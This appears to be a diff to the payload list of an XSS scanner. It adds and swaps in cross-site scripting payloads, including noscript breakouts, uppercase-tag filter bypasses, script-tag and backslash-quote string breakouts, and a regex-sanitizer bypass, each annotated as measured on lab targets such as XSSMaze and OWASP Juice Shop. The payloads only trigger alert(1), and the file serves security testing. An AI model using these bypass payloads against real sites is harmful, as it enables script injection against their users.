@@ -47,7 +47,16 @@
     ]
   },
   "payloads": [
-    {"id": "p173-probe", "context": "html_element", "tags": ["sanitizer_bypass"], "confidence": "high", "payload": "<<script>Foo</script>iframe src=\"javascript:alert(1)\">", "note": "Phase 173 control-experiment probe (non-recursive sanitiser bypass). TEMPORARY."},
+    {
+      "id": "p173-probe",
+      "context": "html_element",
+      "tags": [
+        "sanitizer_bypass"
+      ],
+      "confidence": "high",
+      "payload": "<<script>Foo</script>iframe src=\"javascript:alert(1)\">",
+      "note": "Phase 173 control-experiment probe (non-recursive sanitiser bypass). TEMPORARY."
+    },
     {
       "id": "html-001",
       "context": "html_element",
@@ -79,14 +88,34 @@
       "note": "Img onerror handler"
     },
     {
+      "id": "html-noscript-001",
+      "context": "html_element",
+      "tags": [
+        "noscript_breakout"
+      ],
+      "confidence": "high",
+      "payload": "</noscript><script>alert(1)</script>",
+      "note": "Phase 316: measured on the XSSMaze noscript family (6 endpoints) -- raw reflection inside <noscript>; close it then inject the script (answer-key shape)"
+    },
+    {
+      "id": "html-tagcase-001",
+      "context": "html_element",
+      "tags": [
+        "tag_case_bypass"
+      ],
+      "confidence": "high",
+      "payload": "<IMG SRC=x ONERROR=alert(1)>",
+      "note": "Phase 316: measured on XSSMaze chain-level4 -- case-sensitive lowercase-tag strip; uppercase tag with the JS body intact (the mixed_case transform destroys the JS body, measured)"
+    },
+    {
       "id": "html-004",
       "context": "html_element",
       "tags": [
         "body"
       ],
       "confidence": "high",
-      "payload": "<body onload=alert(1)>",
-      "note": "Body onload"
+      "payload": "<NoScript><script>alert(1)</script>",
+      "note": "Phase 316: replaced in place -- measured on XSSMaze noscript-level3 (only literal lowercase <noscript> is stripped; mixed-case open tag survives); previous shape 0 yield across three full runs"
     },
     {
       "id": "html-005",
@@ -295,6 +324,40 @@
       "confidence": "high",
       "payload": "';alert(1);//",
       "note": "Single-quote string breakout"
+    },
+    {
+      "id": "js-sq-tagbreak-bt-001",
+      "context": "script_string_sq",
+      "tags": [
+        "breakout",
+        "script_tag",
+        "backtick_stamp"
+      ],
+      "confidence": "high",
+      "payload": "</script><script>alert`1`</script>",
+      "note": "Phase 316: jsescape-level2 escapes ' which breaks the quote-based token stamp (measured: the plain breakout confirmed nothing); the backtick stamp carries the token without any quotable character"
+    },
+    {
+      "id": "js-sq-tagbreak-001",
+      "context": "script_string_sq",
+      "tags": [
+        "breakout",
+        "script_tag"
+      ],
+      "confidence": "high",
+      "payload": "</script><script>alert(1)</script>",
+      "note": "Phase 316: measured on XSSMaze jsescape-level2 -- the single quote is escaped but the script tag is not blocked; break out by closing the tag, no quote needed"
+    },
+    {
+      "id": "js-sq-bsquote-001",
+      "context": "script_string_sq",
+      "tags": [
+        "breakout",
+        "backslash_quote"
+      ],
+      "confidence": "high",
+      "payload": "\\';alert(1)//",
+      "note": "Phase 316: measured on XSSMaze nonce-level4 -- the server escapes ' to \\', so a leading backslash turns its escape into a literal backslash and the quote closes the string (answer-key shape)"
     },
     {
       "id": "js-004",
@@ -909,14 +972,14 @@
     {
       "id": "html_element_0081",
       "context": "html_element",
-      "payload": "<svg><style>/*</style>*/<img src=x onerror=alert(1)></svg>",
+      "payload": "</noscript><script>alert(1)</script>",
       "tags": [
         "mxss",
         "svg",
         "mutation"
       ],
       "confidence": "medium",
-      "note": "mXSS: fires after parser re-serialization"
+      "note": "Phase 316: replaced in place at the sync stride-sampled position -- measured on the XSSMaze noscript family (6 endpoints, raw reflection inside <noscript>; answer-key shape); the previous shape had 0 yield across three full runs"
     },
     {
       "id": "html_element_0082",
@@ -1472,14 +1535,14 @@
     {
       "id": "html_element_0130",
       "context": "html_element",
-      "payload": "<form><button formaction=javascript:alert(1)>x</button></form>",
+      "payload": "<NoScript><script>alert(1)</script>",
       "tags": [
         "bypass",
         "waf_evasion",
         "modern"
       ],
       "confidence": "medium",
-      "note": "Modern WAF/filter bypass payload"
+      "note": "Phase 316: replaced in place at the sync stride-sampled position -- measured on XSSMaze noscript-level3 (only literal lowercase <noscript> stripped; mixed-case open tag survives); previous shape 0 yield"
     },
     {
       "id": "html_element_0131",
@@ -1832,14 +1895,14 @@
     {
       "id": "html_element_0160",
       "context": "html_element",
-      "payload": "<table background=javascript:alert(1)></table>",
+      "payload": "<IMG SRC=x ONERROR=alert(1)>",
       "tags": [
         "bypass",
         "waf_evasion",
         "modern"
       ],
       "confidence": "medium",
-      "note": "Modern WAF/filter bypass payload"
+      "note": "Phase 316: replaced in place at the sync stride-sampled position -- measured on XSSMaze chain-level4 (case-sensitive lowercase-tag strip, uppercase tag with intact JS body); previous shape 0 yield across three full runs"
     },
     {
       "id": "html_element_0161",
@@ -15040,6 +15103,17 @@
       "confidence": "high",
       "payload": "<div oncancel=alert(1)>x</div>",
       "note": "long-tail interaction event (final dispatchable batch)"
+    },
+    {
+      "id": "html-legacy-regex-001",
+      "context": "html_element",
+      "tags": [
+        "sanitizer_bypass",
+        "legacy_regex"
+      ],
+      "confidence": "high",
+      "payload": "<<a|ascript>alert(1)</script>",
+      "note": "Phase 285: measured bypass of a homegrown RegEx sanitizer (OWASP Juice Shop legacy profile page, CSP Bypass challenge). The doubled < plus the | inside the tag name keep the sanitizer pattern from matching, so the script survives while a plain <script> block on the same page is stripped. Measured with a real browser: a dialog carried the probe token."
     },
     {
       "id": "ps-ia-206",
